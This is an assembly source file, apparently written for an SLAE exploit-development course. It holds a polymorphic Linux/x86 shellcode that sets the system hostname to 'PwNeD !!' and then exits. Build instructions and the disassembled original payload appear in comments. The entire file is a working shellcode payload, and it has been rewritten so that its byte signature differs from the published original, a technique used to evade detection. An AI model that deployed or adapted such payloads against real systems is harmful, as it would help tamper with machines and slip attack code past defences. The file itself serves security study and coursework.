; Title 	: SLAE Linux/x86 - Assignment-6.2
; Description	: Polymorphic version of Linux/x86 - sys_sethostname(PwNeD !!, 8) - 32 bytes by gunslinger_
; Original 	: http://shell-storm.org/shellcode/files/shellcode-622.php
; Author	: Rizal Muhammed (UB3RSiCK)
; Student ID	: SLAE 933
; Shellcode Len.: 28 bytes (4 Bytes smaller than original)
;
; nasm -f elf32 shellcode-622-poly.nasm -o shellcode-622-poly.o
; ld shellcode-622-poly.o -o shellcode-622-poly -z execstack

section .text
global _start

_start:

;original
;00000000  EB11              jmp short 0x13
;00000002  31C0              xor eax,eax
;00000004  B04A              mov al,0x4a
;00000006  5B                pop ebx
;00000007  B108              mov cl,0x8
;00000009  CD80              int 0x80
;0000000B  31C0              xor eax,eax
;0000000D  B001              mov al,0x1
;0000000F  31DB              xor ebx,ebx
;00000011  CD80              int 0x80
;00000013  E8EAFFFFFF        call dword 0x2
;00000018  50                push eax
;00000019  774E              ja 0x69
;0000001B  6544              gs inc esp
;0000001D  2021              and [ecx],ah
;0000001F  21                db 0x21

;Polymorphic

	xor eax,eax
	push eax
	push dword 0x21212044		; python -c 'print "PwNeD !!"[::-1].encode("hex")'
	push dword 0x654e7750
	mov ebx, esp			; ebx = char __user *name
	mov al, 0x4a			; sys_sethostname = 0x4a
	push 0x8
	pop ecx				; ecx = int len
	int 0x80

	; exit
	mov al,0x1
	xor ebx,ebx
	int 0x80
